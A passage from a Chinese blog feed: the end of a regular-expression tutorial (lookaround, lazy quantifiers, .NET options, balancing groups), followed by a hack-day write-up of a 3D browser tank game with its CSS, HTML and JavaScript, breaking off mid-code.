class="part">(?=&lt;\/\1&gt;)</span>。注意后缀里的<span class="part">\/</span>，它用到了前面提过的字符转义；<span class="part">\1</span>则是一个反向引用，引用的正是<span class="desc">捕获的第一组</span>，前面的<span class="part">(\w+)</span>匹配的内容，这样如果前缀实际上是&lt;b&gt;的话，后缀就是&lt;/b&gt;了。整个表达式匹配的是&lt;b&gt;和&lt;/b&gt;之间的内容(再次提醒，不包括前缀和后缀本身)。</p><h3 id="commenting">注释</h3><p>小括号的另一种用途是通过语法<span class="code">(?#comment)</span>来包含注释。例如：<span><span class="regex">2[0-4]\d(?#200-249)|25[0-5](?#250-255)|[01]?\d\d?(?#0-199)</span>。</span></p><p>要包含注释的话，最好是启用\忽略模式里的空白符"选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。启用这个选项后，在#后面到这一行结束的所有文本都将被当成注释忽略掉。例如，我们可以前面的一个表达式写成这样：</p><pre class="regex"><span>      (?&lt;=    # 断言要匹配的文本的前缀      &lt;(\w+)&gt; # 查找尖括号括起来的字母或数字(即HTML/XML标签)      )       # 前缀结束      .*      # 匹配任意文本      (?=     # 断言要匹配的文本的后缀      &lt;\/\1&gt;  # 查找尖括号括起来的内容：前面是一个"/"，后面是先前捕获的标签      )       # 后缀结束</span></pre><h3 id="greedyandlazy">贪婪与懒惰</h3><p>当正则表达式中包含能接受重复的限定符时，通常的行为是（在使整个表达式能得到匹配的前提下）匹配<strong>尽可能多</strong>的字符。以这个表达式为例：<span class="regex">a.*b</span>，它将会匹配<span class="desc">最长的以a开始，以b结束的字符串</span>。如果用它来搜索<span class="string">aabab</span>的话，它会匹配整个字符串<span class="desc">aabab</span>。这被称为<span class="name">贪婪</span>匹配。</p><p>有时，我们更需要<span class="name">懒惰</span>匹配，也就是匹配<strong>尽可能少</strong>的字符。前面给出的限定符都可以被转化为懒惰匹配模式，只要在它后面加上一个问号<span class="code">?</span>。这样<span class="regex">.*?</span>就意味着<span class="desc">匹配任意数量的重复，但是在能使整个匹配成功的前提下使用最少的重复</span>。现在看看懒惰版的例子吧：</p><p><span class="regex">a.*?b</span>匹配<span class="desc">最短的，以a开始，以b结束的字符串</span>。如果把它应用于<span class="string">aabab</span>的话，它会匹配<span class="desc">aab（第一到第三个字符）</span>和<span class="desc">ab（第四到第五个字符）</span>。</p><p class="note">为什么第一个匹配是aab（第一到第三个字符）而不是ab（第二到第三个字符）？简单地说，因为正则表达式有另一条规则，比懒惰／贪婪规则的优先级更高：最先开始的匹配拥有最高的优先权&mdash;&mdash;The match that begins earliest wins。</p><table cellspacing="0"><caption>表5.懒惰限定符</caption><thead><tr><th scope="col">代码/语法</th><th scope="col">说明</th></tr></thead><tbody><tr><td><span class="code">*?</span></td><td><span class="desc">重复任意次，但尽可能少重复</span></td></tr><tr><td><span class="code">+?</span></td><td><span class="desc">重复1次或更多次，但尽可能少重复</span></td></tr><tr><td><span class="code">??</span></td><td><span class="desc">重复0次或1次，但尽可能少重复</span></td></tr><tr><td><span class="code">{n,m}?</span></td><td><span class="desc">重复n到m次，但尽可能少重复</span></td></tr><tr><td><span class="code">{n,}?</span></td><td><span class="desc">重复n次以上，但尽可能少重复</span></td></tr></tbody></table><h3 id="regexoptions">处理选项</h3><p><span>在C#中，你可以使用</span><a title="MSDN 相关文档" href="http://msdn2.microsoft.com/zh-cn/library/h5845fdz.aspx">Regex(String, RegexOptions)构造函数</a><span>来设置正则表达式的处理选项。如：Regex regex = new Regex(@"\ba\w{6}\b", RegexOptions.IgnoreCase);</span></p><p>上面介绍了几个选项如忽略大小写，处理多行等，这些选项能用来改变处理正则表达式的方式。下面是.Net中常用的正则表达式选项：</p><table cellspacing="0"><caption>表6.常用的处理选项</caption><thead><tr><th scope="col">名称</th><th scope="col">说明</th></tr></thead><tbody><tr><td><span>IgnoreCase(忽略大小写)</span></td><td>匹配时不区分大小写。</td></tr><tr><td>Multiline(多行模式)</td><td>更改<span class="code">^</span>和<span class="code">$</span>的含义，使它们分别在任意一行的行首和行尾匹配，而不仅仅在整个字符串的开头和结尾匹配。(在此模式下,<span class="code">$</span>的精确含意是:匹配\n之前的位置以及字符串结束前的位置.)</td></tr><tr><td>Singleline(单行模式)</td><td>更改<span class="code">.</span>的含义，使它与每一个字符匹配（包括换行符\n）。</td></tr><tr><td>IgnorePatternWhitespace(忽略空白)</td><td>忽略表达式中的非转义空白并启用由<span class="code">#</span>标记的注释。</td></tr><tr><td>ExplicitCapture(显式捕获)</td><td>仅捕获已被显式命名的组。</td></tr></tbody></table><p>一个经常被问到的问题是：是不是只能同时使用多行模式和单行模式中的一种？答案是：不是。这两个选项之间没有任何关系，除了它们的名字比较相似（以至于让人感到疑惑）以外。</p><h3 id="balancedgroup">平衡组/递归匹配</h3><p class="important note">这里介绍的平衡组语法是由.Net Framework支持的；其它语言／库不一定支持这种功能，或者支持此功能但需要使用不同的语法。</p><p>有时我们需要匹配像<span class="desc">( 100 * ( 50 + 15 ) )这样的可嵌套的层次性结构</span>，这时简单地使用<span class="code">\(.+\)</span>则只会匹配到最左边的左括号和最右边的右括号之间的内容(这里我们讨论的是贪婪模式，懒惰模式也有下面的问题)。假如原来的字符串里的左括号和右括号出现的次数不相等，比如<span class="string">( 5 / ( 3 + 2 ) ) )</span>，那我们的匹配结果里两者的个数也不会相等。有没有办法在这样的字符串里匹配到最长的，配对的括号之间的内容呢？</p><p>为了避免<span class="code">(</span>和<span class="code">\(</span>把你的大脑彻底搞糊涂，我们还是用尖括号代替圆括号吧。现在我们的问题变成了如何把<span class="string">xx &lt;aa &lt;bbb&gt; &lt;bbb&gt; aa&gt; yy</span>这样的字符串里，最长的配对的尖括号内的内容捕获出来？</p><p>这里需要用到以下的语法构造：</p><ul><li><span class="code">(?'group')</span> 把捕获的内容命名为group,并压入<span class="name">堆栈(Stack)</span></li><li><span class="code">(?'-group')</span> 从堆栈上弹出最后压入堆栈的名为group的捕获内容，如果堆栈本来为空，则本分组的匹配失败</li><li><span class="code">(?(group)yes|no) </span>如果堆栈上存在以名为group的捕获内容的话，继续匹配yes部分的表达式，否则继续匹配no部分</li><li><span class="code">(?!)</span> 零宽负向先行断言，由于没有后缀表达式，试图匹配总是失败</li></ul><p class="note">如果你不是一个程序员（或者你自称程序员但是不知道堆栈是什么东西），你就这样理解上面的三种语法吧：第一个就是在黑板上写一个"group"，第二个就是从黑板上擦掉一个"group"，第三个就是看黑板上写的还有没有"group"，如果有就继续匹配yes部分，否则就匹配no部分。</p><p>我们需要做的是每碰到了左括号，就在压入一个"Open",每碰到一个右括号，就弹出一个，到了最后就看看堆栈是否为空－－如果不为空那就证明左括号比右括号多，那匹配就应该失败。正则表达式引擎会进行回溯(放弃最前面或最后面的一些字符)，尽量使整个表达式得到匹配。</p><pre class="regex"><span>&lt;                         <span>#最外层的左括号</span>    [^&lt;&gt;]*                <span>#最外层的左括号后面的不是括号的内容</span>    (        (            (?'Open'&lt;)    <span>#碰到了左括号，在黑板上写一个"Open"</span>            [^&lt;&gt;]*       <span>#匹配左括号后面的不是括号的内容</span>        )+        (            (?'-Open'&gt;)   <span>#碰到了右括号，擦掉一个"Open"</span>            [^&lt;&gt;]*        <span>#匹配右括号后面不是括号的内容</span>        )+    )*    (?(Open)(?!))         <span>#在遇到最外层的右括号前面，判断黑板上还有没有没擦掉的"Open"；如果还有，则匹配失败</span><p>&gt;                         <span>#最外层的右括号</span></span></pre></p><p>平衡组的一个最常见的应用就是匹配HTML,下面这个例子可以匹配<span class="desc">嵌套的&lt;div&gt;标签</span>：<span class="regex">&lt;div[^&gt;]*&gt;[^&lt;&gt;]*(((?'Open'&lt;div[^&gt;]*&gt;)[^&lt;&gt;]*)+((?'-Open'&lt;/div&gt;)[^&lt;&gt;]*)+)*(?(Open)(?!))&lt;/div&gt;</span>.</p><h3 id="more">还有些什么东西没提到</h3><p>上边已经描述了构造正则表达式的大量元素，但是还有很多没有提到的东西。下面是一些未提到的元素的列表，包含语法和简单的说明。你可以在网上找到更详细的参考资料来学习它们--当你需要用到它们的时候。如果你安装了MSDN Library,你也可以在里面找到.net下正则表达式详细的文档。</p><p class="note">这里的介绍很简略，如果你需要更详细的信息，而又没有在电脑上安装MSDN Library,可以查看<a href="http://msdn.microsoft.com/zh-cn/library/az24scfc.aspx">关于正则表达式语言元素的MSDN在线文档</a>。</p><table cellspacing="0"><caption>表7.尚未详细讨论的语法</caption><thead><tr><th scope="col">代码/语法</th><th scope="col">说明</th></tr></thead><tbody><tr><td><span class="code">\a</span></td><td><span class="desc">报警字符(打印它的效果是电脑嘀一声)</span></td></tr><tr><td><span class="code">\b</span></td><td><span class="desc">通常是单词分界位置，但如果在字符类里使用代表退格</span></td></tr><tr><td><span class="code">\t</span></td><td><span class="desc">制表符，Tab</span></td></tr><tr><td><span class="code">\r</span></td><td><span class="desc">回车</span></td></tr><tr><td><span class="code">\v</span></td><td><span class="desc">竖向制表符</span></td></tr><tr><td><span class="code">\f</span></td><td><span class="desc">换页符</span></td></tr><tr><td><span class="code">\n</span></td><td><span class="desc">换行符</span></td></tr><tr><td><span class="code">\e</span></td><td><span class="desc">Escape</span></td></tr><tr><td><span class="code">\0nn</span></td><td><span class="desc">ASCII代码中八进制代码为nn的字符</span></td></tr><tr><td><span class="code">\xnn</span></td><td><span class="desc">ASCII代码中十六进制代码为nn的字符</span></td></tr><tr><td><span class="code">\unnnn</span></td><td><span class="desc">Unicode代码中十六进制代码为nnnn的字符</span></td></tr><tr><td><span class="code">\cN</span></td><td><span class="desc">ASCII控制字符。比如\cC代表Ctrl+C</span></td></tr><tr><td><span class="code">\A</span></td><td><span class="desc">字符串开头(类似^，但不受处理多行选项的影响)</span></td></tr><tr><td><span class="code">\Z</span></td><td><span class="desc">字符串结尾或行尾(不受处理多行选项的影响)</span></td></tr><tr><td><span class="code">\z</span></td><td><span class="desc">字符串结尾(类似$，但不受处理多行选项的影响)</span></td></tr><tr><td><span class="code">\G</span></td><td><span class="desc">当前搜索的开头</span></td></tr><tr><td><span class="code">\p{name}</span></td><td><span class="desc">Unicode中命名为name的字符类，例如\p{IsGreek}</span></td></tr><tr><td><span class="code">(?&gt;exp)</span></td><td><span class="desc">贪婪子表达式</span></td></tr><tr><td><span class="code">(?&lt;x&gt;-&lt;y&gt;exp)</span></td><td><span class="desc">平衡组</span></td></tr><tr><td><span class="code">(?im-nsx:exp)</span></td><td><span class="desc">在子表达式exp中改变处理选项</span></td></tr><tr><td><span class="code">(?im-nsx)</span></td><td><span class="desc">为表达式后面的部分改变处理选项</span></td></tr><tr><td><span class="code">(?(exp)yes|no)</span></td><td><span class="desc">把exp当作零宽正向先行断言，如果在这个位置能匹配，使用yes作为此组的表达式；否则使用no</span></td></tr><tr><td><span class="code">(?(exp)yes)</span></td><td><span class="desc">同上，只是使用空表达式作为no</span></td></tr><tr><td><span class="code">(?(name)yes|no)</span></td><td><span class="desc">如果命名为name的组捕获到了内容，使用yes作为表达式；否则使用no</span></td></tr><tr><td><span class="code">(?(name)yes)</span></td><td><span class="desc">同上，只是使用空表达式作为no</span></td></tr></tbody></table><p>布局排版：<a href="http://www.cnblogs.com/hustskyking" target="_blank">Barret Lee</a></p><p>本文转自：<a href="http://www.jb51.net/tools/zhengze.html" target="_blank">http://www.jb51.net/tools/zhengze.html&nbsp;</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 剪贴板 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3D遥控坦克大战</title>
      <link href="/blog/2013/06/03/cb-3D-Tank-War/"/>
      <url>/blog/2013/06/03/cb-3D-Tank-War/</url>
      
        <content type="html"><![CDATA[<p><span>昨天参加了hack day的一个比赛，赛制大致是：24小时，自由组队2~4人，任意发挥。运气比较好，拿了第三名和最佳创意奖。</span></p><p><span>建议先看看这个demo，bug是有的，chrome下玩玩，测试测试就行，O(&cap;_&cap;)O~</span></p><p><span>　　DEMO：<a title="3D tank" href="http://qianduannotes.sinaapp.com/3dtank/html/index.html" target="_blank">http://qianduannotes.sinaapp.com/3dtank/html/index.html</a></span></p><p>&nbsp;基本效果:</p><p><img src="https://images.cnitblog.com/blog/387325/201306/03235624-efc5a0a6284d45ce867229cc73a5d3f0.png" alt="" width="573" height="300"></p><h3><span>关于</span></h3><p><span>懒得去SAE上折腾，没把那另外一半的功能补上，不过我还是介绍下这几个没补上功能吧。</span></p><p><span>　　<strong>1. 音效</strong>。开始音乐是比较古老的坦克大战开机音乐。</span></p><p><span>　　　　① 开始音效 <a title="start" href="http://qianduannotes.sinaapp.com/3dtank/test.html#begin" target="_blank">点击播放</a></span></p><p><span>　　　　② 发子弹 &nbsp; &nbsp;<a title="shoot" href="http://qianduannotes.sinaapp.com/3dtank/test.html#shoot" target="_blank">点击播放</a></span></p><p><span>　　　　③ 击中坦克&nbsp;<a title="hit" href="http://qianduannotes.sinaapp.com/3dtank/test.html#hit" target="_blank">点击播放</a></span></p><p><span>　　　　④ 爆炸 &nbsp; &nbsp; &nbsp;&nbsp;<a title="explode" href="http://qianduannotes.sinaapp.com/3dtank/test.html#explode" target="_blank">点击播放</a></span></p><p><span>　　②和③是自己录制的，呵呵，DIY的东西才好玩。</span></p><p><span>　　<strong>2. 登录验证</strong></span></p><p><span>　　<img src="https://images.cnitblog.com/blog/387325/201306/03231602-a2fe0e78de744ae5a32b23132f769107.png" alt=""></span></p><p>　　采用的是解锁，这个创意应该是非常不错的，当登录的时候，A、B玩家下方会生成一个如上图的canvas解锁块，当然这个解锁卡也会通过socket传送到手机遥控端，手机解锁成功后方可登录。</p><p>　　<img src="https://images.cnitblog.com/blog/387325/201306/03231922-39fd5ae76f1041e1a6cd2238b97b6a9b.png" alt="" width="497" height="260"></p><p><strong>　　3. 坦克360&deg;旋转</strong></p><p>　　由于键盘控制只能上下左右，所以360&deg;是转不出来的..刚想截一张手机控制游戏的图，总是报错...囧（后台用的是php，socket控制信号传输，刚打开手机端网页的时候php socket报错）。<strong></strong></p><p>手机遥控端视图：</p><p><img src="https://images.cnitblog.com/blog/387325/201306/04082543-27c0d64ccf184cd08477d5a2c6b87e2d.png" alt=""></p><p>　　这里主要利用的是手机多点触控，touchstart,touchmove,touchend这三个事件。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> canvas<span class="constructor">AddListener()</span> &#123;</span><br><span class="line">    canvas.add<span class="constructor">EventListener(&#x27;<span class="params">touchstart</span>&#x27;, <span class="params">onTouchStart</span>, <span class="params">false</span>)</span>;</span><br><span class="line">    canvas.add<span class="constructor">EventListener(&#x27;<span class="params">touchmove</span>&#x27;, <span class="params">onTouchMove</span>, <span class="params">false</span>)</span>;</span><br><span class="line">    canvas.add<span class="constructor">EventListener(&#x27;<span class="params">touchend</span>&#x27;, <span class="params">onTouchEnd</span>, <span class="params">false</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>&nbsp;</span></p><p><strong>　　4. 重新开始游戏和打死坦克添加效果等</strong></p><p><em>以上都是没有公开显示出来的效果，下次弄好了再上传吧，嘻嘻。</em></p><h3>先说说前台</h3><p>前台主要采用的是css3和js（这是废话）。</p><p><strong>1. css3构建一个3D游戏场地</strong></p><p>效果：</p><p><img src="https://images.cnitblog.com/blog/387325/201306/04000040-cee0817672774eb8bdd6a3a2e14e22f4.png" alt="" width="339" height="338"></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">position</span>:relative;</span><br><span class="line">    -webkit-<span class="attribute">transform-style</span>: preserve-<span class="number">3</span>d;</span><br><span class="line">    <span class="comment">/*-webkit-transform: rotateY(40deg);*/</span></span><br><span class="line">    -webkit-<span class="attribute">transition</span>:all <span class="number">1s</span> ease-in-out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.inBox</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">height</span>:<span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">0px</span> <span class="number">2px</span> white;</span><br><span class="line">    <span class="attribute">background</span>:<span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,.<span class="number">2</span>);</span><br><span class="line">    <span class="comment">/*background:#779443;*/</span></span><br><span class="line">    <span class="attribute">position</span>:absolute;</span><br><span class="line">    <span class="attribute">top</span>:<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">left</span>:<span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">color</span>:white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box-forward</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">0deg</span>) <span class="built_in">translateZ</span>(<span class="number">150px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box-back</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">180deg</span>) <span class="built_in">translateZ</span>(<span class="number">150px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box-left</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">270deg</span>) <span class="built_in">translateZ</span>(<span class="number">150px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box-right</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>: <span class="built_in">rotateY</span>(<span class="number">90deg</span>) <span class="built_in">translateZ</span>(<span class="number">150px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box-top</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>:<span class="built_in">rotateX</span>(<span class="number">90deg</span>) <span class="built_in">translateZ</span>(<span class="number">150px</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.box-bottom</span> &#123;</span><br><span class="line">    -webkit-<span class="attribute">transform</span>:<span class="built_in">rotateX</span>(-<span class="number">90deg</span>) <span class="built_in">translateZ</span>(<span class="number">150px</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面是css部分，比赛过程中，参看了下张鑫旭大哥的文章（之前这块还不是很了解的），<a title="好吧，CSS3 3D transform变换，不过如此！" href="http://www.zhangxinxu.com/wordpress/2012/09/css3-3d-transform-perspective-animate-transition/" target="_blank">文章链接</a>。就不细说了。</p><p>下面是HTML部分：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;w&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inBox box-forward&quot;</span> <span class="attr">data-num</span>=<span class="string">&quot;upF rightF downF leftF&quot;</span> <span class="attr">data-v</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inBox box-back&quot;</span> <span class="attr">data-num</span>=<span class="string">&quot;upF leftF downF rightF&quot;</span> <span class="attr">data-v</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inBox box-left&quot;</span> <span class="attr">data-num</span>=<span class="string">&quot;upF forwardF downF backF&quot;</span> <span class="attr">data-v</span>=<span class="string">&quot;3&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inBox box-right&quot;</span> <span class="attr">data-num</span>=<span class="string">&quot;upF backF downF forwardF&quot;</span> <span class="attr">data-v</span>=<span class="string">&quot;4&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inBox box-top&quot;</span> <span class="attr">data-num</span>=<span class="string">&quot;backF rightF forwardF leftF&quot;</span> <span class="attr">data-v</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;inBox box-bottom&quot;</span> <span class="attr">data-num</span>=<span class="string">&quot;backF leftF forwardF rightF&quot;</span> <span class="attr">data-v</span>=<span class="string">&quot;6&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2. JS这块，写了比较多。</strong></p><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> $ = document.querySelectorAll.bind(document);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@description</span> core part</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> hustskyking</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> faces = $(<span class="string">&quot;.inBox&quot;</span>),</span><br><span class="line">    bloodA = $(<span class="string">&quot;.bloodA div&quot;</span>)[<span class="number">0</span>],</span><br><span class="line">    bloodB = $(<span class="string">&quot;.bloodB div&quot;</span>)[<span class="number">0</span>],</span><br><span class="line"></span><br><span class="line">    box = $(<span class="string">&quot;.box&quot;</span>)[<span class="number">0</span>],</span><br><span class="line">    upF = $(<span class="string">&quot;.box-top&quot;</span>)[<span class="number">0</span>],</span><br><span class="line">    downF = $(<span class="string">&quot;.box-bottom&quot;</span>)[<span class="number">0</span>],</span><br><span class="line">    leftF = $(<span class="string">&quot;.box-left&quot;</span>)[<span class="number">0</span>],</span><br><span class="line">    rightF = $(<span class="string">&quot;.box-right&quot;</span>)[<span class="number">0</span>],</span><br><span class="line">    forwardF = $(<span class="string">&quot;.box-forward&quot;</span>)[<span class="number">0</span>],</span><br><span class="line">    backF = $(<span class="string">&quot;.box-back&quot;</span>)[<span class="number">0</span>],</span><br><span class="line"></span><br><span class="line">    cSize = upF.clientWidth,</span><br><span class="line">    datas = &#123;</span><br><span class="line">        <span class="string">&quot;upF&quot;</span>: upF,</span><br><span class="line">        <span class="string">&quot;downF&quot;</span>: downF,</span><br><span class="line">        <span class="string">&quot;leftF&quot;</span>: leftF,</span><br><span class="line">        <span class="string">&quot;rightF&quot;</span>: rightF,</span><br><span class="line">        <span class="string">&quot;forwardF&quot;</span>: forwardF,</span><br><span class="line">        <span class="string">&quot;backF&quot;</span>: backF</span><br><span class="line">    &#125;,</span><br><span class="line">    stopN = <span class="number">0</span>,</span><br><span class="line">    tanks = &#123;&#125;,</span><br><span class="line">    randomTank = <span class="number">2</span>,</span><br><span class="line">    tankLimit  = <span class="number">20</span>,</span><br><span class="line">                    <span class="comment">//a   w   d  s   j      ←   ↑   →  ↓   p</span></span><br><span class="line">    debug_keySet = [[<span class="number">65</span>, <span class="number">87</span>, <span class="number">68</span>, <span class="number">83</span>, <span class="number">74</span>], [<span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">80</span>]];</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">@Class</span> Tank</span></span><br><span class="line"><span class="comment">* <span class="doctag">@attrs</span> width, height, currentX, currentY, speedX, speedY, angleX, angleY, plusy, plusx</span></span><br><span class="line"><span class="comment">*        container, dataset, stopN, tank, tankId, life, bulletBox, color, timerLimit, timer, gap,</span></span><br><span class="line"><span class="comment">         sTime</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> Tank = function(setting)&#123;</span><br><span class="line">    <span class="keyword">var</span> opts = setting || &#123;&#125;;</span><br><span class="line">    <span class="keyword">this</span>.container = opts.container || forwardF;</span><br><span class="line">    <span class="keyword">this</span>.dataset   = <span class="keyword">this</span>.container.getAttribute(<span class="string">&#x27;data-num&#x27;</span>).split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.belong = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.grade  = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.debug  = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.width  = opts.width || <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">this</span>.height = opts.height || <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">this</span>.stopN  = <span class="string">&quot;keyup&quot;</span> + (window.stopN++);</span><br><span class="line">    <span class="keyword">this</span>.gap    = opts.gap || <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">this</span>.speed  = opts.speed || <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">this</span>.ax     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.ay     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.cx     = opts.cx || (cSize - <span class="keyword">this</span>.width) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">this</span>.cy     = opts.cy || (cSize - <span class="keyword">this</span>.height) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">this</span>.sx     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.sy     = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.tank   = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.tankId = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">this</span>.life   = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">this</span>.color  = opts.color || <span class="string">&quot;#0047B3&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.bulletBox = [];</span><br><span class="line">    <span class="keyword">this</span>.bColor = opts.bColor || <span class="string">&quot;#0047B3&quot;</span>;</span><br><span class="line">    <span class="keyword">this</span>.timerLimit= <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">this</span>.gunAngle  = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.timer     = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.sTime     = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Tank.prototype = &#123;</span><br><span class="line">    <span class="keyword">init</span>: function(tankId, debug)&#123;</span><br><span class="line">        <span class="keyword">if</span>(tankId)&#123;</span><br><span class="line">            <span class="keyword">this</span>.tankId = tankId;</span><br><span class="line">            <span class="keyword">this</span>.belong = (Number(tankId) &gt; <span class="number">2</span> ? <span class="number">2</span> :Number(tankId));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> new Error(<span class="string">&quot;必须设置tank ID&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> this_ = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//绘制坦克</span></span><br><span class="line">        <span class="keyword">this</span>.paintTank();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(debug)&#123;</span><br><span class="line">            <span class="keyword">this</span>.debug = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">this</span>.keySet = debug.keySet;</span><br><span class="line">            window.addEventListener(<span class="string">&quot;keydown&quot;</span>, function()&#123;</span><br><span class="line">                this_.move_debug();</span><br><span class="line">            &#125;, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        window.addEventListener(<span class="keyword">this</span>.stopN, function()&#123;</span><br><span class="line">            clearInterval(this_.timer);</span><br><span class="line">        &#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    paintTank: function()&#123;</span><br><span class="line">        <span class="keyword">var</span> tank = document.createElement(<span class="string">&quot;span&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> circle = document.createElement(<span class="string">&quot;span&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> gun = 